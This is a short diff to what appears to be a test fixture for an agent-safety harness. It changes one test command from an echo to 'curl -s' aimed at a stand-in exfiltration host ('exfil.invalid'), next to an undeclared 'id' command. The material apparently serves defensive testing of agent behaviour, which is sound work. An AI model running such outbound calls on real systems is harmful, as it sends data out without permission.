@@ -40,7 +40,7 @@ CANARY_TOOL = "safeagents_canary"
 EXFIL_HOST = "exfil.invalid"
 COMMANDS = {
     "undeclared": "id",
-    "host": f"echo https://{EXFIL_HOST}/probe",
+    "host": f"curl -s https://{EXFIL_HOST}/probe",
     "clean": f"echo {CLEAN_OUTPUT}",
 }
 FINAL_TEXT = "Done."
